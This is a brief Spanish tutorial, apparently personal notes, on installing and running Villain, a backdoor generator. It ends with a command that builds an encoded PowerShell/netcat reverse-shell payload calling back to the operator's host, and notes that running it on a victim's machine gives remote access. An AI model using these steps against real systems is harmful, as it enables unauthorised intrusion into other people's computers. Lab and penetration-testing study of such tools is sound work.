Villain es una herramienta de generación de backdoors para Windows y Linux que permite a los usuarios conectarse con servidores hermanos (otras máquinas que ejecutan Villain) y compartir sus sesiones de backdoor, lo que es útil para trabajar en equipo.  
  
Villain le permite a un hacker generar un payload en PowerShell, el cual puede ser insertado dentro de un archivo .exe o macro.

GitHub:
https://github.com/t3l3machus/Villain

### Tutorial Villain

Primero nos descargamos el repositorio en nuestro sistema, entramos en la carpeta y cambiamos los permisos del programa
![[Pasted image 20240214132020.png]]

Ejecutamos el siguiente comando para instalar unas librerias que necesita la herramienta
pip install -r requirements.txt
![[Pasted image 20240214132124.png|1000]]

Ahora ya podemos ejecutar el programa, para ello escribimos lo siguiente
python3 Villain.py
![[Pasted image 20240214132300.png|400]]

Con el comando help nos muestra todos los comandos de la herramienta
![[Pasted image 20240214132533.png]]

Con el comando help generate tenemos las instrucciones de uso
![[Pasted image 20240214132459.png]]

Con el sigueinte comando generaremos un payload para hacer un reverse shell de un sistema windows
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth1 encode 
![[Pasted image 20240214133839.png|1000]]

Si nosostros ahora conseguimos ejecutar este payload en la maquina victima conseguiremos una reverse shell y tendremos acceso a la maquina



